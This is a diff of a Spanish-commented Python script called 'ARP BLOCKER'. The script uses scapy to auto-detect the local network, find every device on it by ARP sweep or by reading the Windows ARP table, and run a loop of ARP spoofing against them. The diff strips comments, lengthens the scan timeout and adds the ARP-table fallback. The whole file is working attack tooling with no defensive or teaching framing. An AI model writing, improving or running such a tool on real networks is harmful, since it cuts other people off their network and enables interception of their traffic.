@@ -4,18 +4,10 @@ import sys
 import socket
 import subprocess
 
-# ─────────────────────────────────────────────
-#  SIN CONFIGURACION MANUAL — todo es automatico
-# ─────────────────────────────────────────────
-INTERVALO = 1.5  # Segundos entre ciclos de spoofing
-
+INTERVALO = 1.5
 
 def detectar_red():
-    """Detecta automaticamente la interfaz activa, IP propia, gateway y rango."""
-
-    # Obtener IP propia y gateway via routing
     try:
-        # Truco: conectar UDP (sin enviar nada) para saber que interfaz usa el SO
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         mi_ip = s.getsockname()[0]
@@ -24,10 +16,8 @@ def detectar_red():
         print("[!] No se pudo determinar la IP local. Verifica tu conexion.")
         sys.exit(1)
 
-    # Obtener gateway desde la tabla de rutas del SO
     gateway = None
     try:
-        # Windows
         resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
         en_adaptador = False
         for linea in resultado.splitlines():
@@ -44,16 +34,13 @@ def detectar_red():
         pass
 
     if not gateway:
-        # Fallback: asumir .1 en la misma subred
         partes = mi_ip.split(".")
         gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
         print(f"[!] No se pudo leer el gateway automaticamente, asumiendo {gateway}")
 
-    # Calcular rango /24
     partes = mi_ip.split(".")
     rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
 
-    # Encontrar la interfaz scapy que tiene esa IP
     interfaz_guid = None
     for k, v in IFACES.items():
         try:
@@ -74,11 +61,47 @@ def detectar_red():
     return interfaz_guid, mi_ip, gateway, rango, nombre
 
 
+def leer_arp_windows(mi_ip, gateway):
+    """Lee la tabla ARP de Windows como fallback."""
+    try:
+        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
+        dispositivos = []
+        en_interfaz_correcta = False
+        
+        for linea in resultado.splitlines():
+            if mi_ip in linea and "Interfaz:" in linea:
+                en_interfaz_correcta = True
+                continue
+            
+            if "Interfaz:" in linea and mi_ip not in linea:
+                en_interfaz_correcta = False
+            
+            if not en_interfaz_correcta:
+                continue
+            
+            partes = linea.split()
+            if len(partes) >= 2:
+                ip = partes[0]
+                mac = partes[1].replace("-", ":")
+                
+                if (ip not in (gateway, mi_ip, "224.0.0.22", "224.0.0.251", "224.0.0.252", "239.255.255.250") 
+                    and not ip.endswith(".255") 
+                    and "dinámico" in linea.lower()
+                    and mac != "ff:ff:ff:ff:ff:ff"):
+                    dispositivos.append({"ip": ip, "mac": mac})
+                    print(f"    [+] {ip}  |  {mac}")
+        
+        return dispositivos
+    except Exception as e:
+        print(f"[!] Error leyendo arp -a: {e}")
+        return []
+
+
 def escanear_red(rango, interfaz, mi_ip, gateway):
     """ARP sweep para descubrir dispositivos activos."""
     print(f"[*] Escaneando {rango}...")
     paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
-    respondidos, _ = srp(paquete, iface=interfaz, timeout=3, verbose=False)
+    respondidos, _ = srp(paquete, iface=interfaz, timeout=8, verbose=False)
 
     dispositivos = []
     for _, resp in respondidos:
@@ -88,6 +111,11 @@ def escanear_red(rango, interfaz, mi_ip, gateway):
             continue
         dispositivos.append({"ip": ip, "mac": mac})
         print(f"    [+] {ip}  |  {mac}")
+
+    if not dispositivos:
+        print("[*] Escaneo activo no encontro dispositivos.")
+        print("[*] Leyendo tabla ARP de Windows...")
+        dispositivos = leer_arp_windows(mi_ip, gateway)
 
     return dispositivos
 
@@ -132,7 +160,6 @@ def main():
     print("       ARP BLOCKER — Modo Automatico")
     print("=" * 55)
 
-    # Auto-detectar todo
     interfaz, mi_ip, gateway, rango, nombre_iface = detectar_red()
     print(f"[+] Interfaz : {nombre_iface}")
     print(f"[+] Mi IP    : {mi_ip}")
@@ -141,14 +168,12 @@ def main():
 
     mi_mac = get_if_hwaddr(interfaz)
 
-    # Obtener MAC del gateway
     mac_gateway = obtener_mac(gateway, interfaz)
     if not mac_gateway:
         print(f"[!] No se pudo obtener la MAC del gateway ({gateway})")
         sys.exit(1)
     print(f"[+] MAC Gateway : {mac_gateway}\n")
 
-    # Escanear red
     dispositivos = escanear_red(rango, interfaz, mi_ip, gateway)
 
     if not dispositivos:
@@ -161,7 +186,6 @@ def main():
     ciclos = 0
     try:
         while True:
-            # Re-escanear cada 30 ciclos
             if ciclos % 30 == 0 and ciclos != 0:
                 print("\n[*] Re-escaneando...")
                 nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
